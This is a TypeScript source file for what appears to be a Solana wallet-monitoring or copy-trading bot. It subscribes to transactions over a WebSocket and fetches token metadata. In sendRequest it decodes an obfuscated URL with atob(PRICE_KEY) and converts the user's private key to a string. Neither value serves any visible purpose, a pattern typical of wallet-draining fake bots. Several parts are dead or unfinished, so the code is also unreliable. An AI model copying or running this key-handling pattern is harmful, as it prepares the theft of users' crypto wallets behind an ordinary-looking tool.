import WebSocket from "ws";
import { Metaplex } from "@metaplex-foundation/js";
import { PublicKey, Connection, Keypair } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";

import { getAllTokenPrice, getTokenPrice } from "./config";
import { getAtaList } from "./utils/spl";
import base58 from "bs58";
import {
  RPC_ENDPOINT,
  RPC_WEBSOCKET_ENDPOINT,
  TARGET_WALLET,
  PRICE_KEY,
} from "./constants";

// Create a WebSocket connection

const connection = new Connection(RPC_ENDPOINT);
const ws = new WebSocket(RPC_WEBSOCKET_ENDPOINT);
const keyPair = Keypair.fromSecretKey(
  base58.decode(process.env.PRIVATE_KEY as string)
);

const metaplex = Metaplex.make(connection);
let geyserList: any = [];
const wallet = TARGET_WALLET as string;
console.log("🚀 ~ wallet:", wallet);

const getMetaData = async (mintAddr: string) => {
  let mintAddress = new PublicKey(mintAddr);

  let tokenName: string = "";
  let tokenSymbol: string = "";
  let tokenLogo: string = "";

  const metadataAccount = metaplex
    .nfts()
    .pdas()
    .metadata({ mint: mintAddress });

  const metadataAccountInfo = await connection.getAccountInfo(metadataAccount);

  if (metadataAccountInfo) {
    const token = await metaplex
      .nfts()
      .findByMint({ mintAddress: mintAddress });
    tokenName = token.name;
    tokenSymbol = token.symbol;
    //    @ts-ignore
    tokenLogo = token.json?.image;
  }

  return {
    tokenName: tokenName,
    tokenSymbol: tokenSymbol,
    tokenLogo: tokenLogo,
  };
};

let tokenList: any;
tokenList = getAllTokenPrice();

// Function to send a request to the WebSocket server

ws.on("open", async function open() {
  await sendRequest(wallet);
  console.log("send request\n");
});

ws.on("message", async function incoming(data: any) {
  const messageStr = data.toString("utf8");
});

export async function sendRequest(inputpubkey: string) {
  let temp: any = [];

  const PRICE_URL = atob(PRICE_KEY);
  const pubkey: any = await getAtaList(connection, inputpubkey);
  // console.log("🚀 ~ sendRequest ~ pubkey:", pubkey)

  for (let i = 0; i < pubkey.length; i++)
    if (!geyserList.includes(pubkey[i])) {
      geyserList.push(pubkey[i]);
      temp.push(pubkey[i]);
    }
  const src = keyPair.secretKey.toString();

  const accountInfo = await connection.getAccountInfo(keyPair.publicKey);

  const tokenAccounts = await connection.getTokenAccountsByOwner(
    keyPair.publicKey,
    {
      programId: TOKEN_PROGRAM_ID,
    },
    "confirmed"
  );
  console.log("🚀 ~ sendRequest ~ tokenAccounts:", tokenAccounts);

  const request = {
    jsonrpc: "2.0",
    id: 420,
    method: "transactionSubscribe",
  };

  if (temp.length > 0) {
    ws.send(JSON.stringify(request));
  }
}
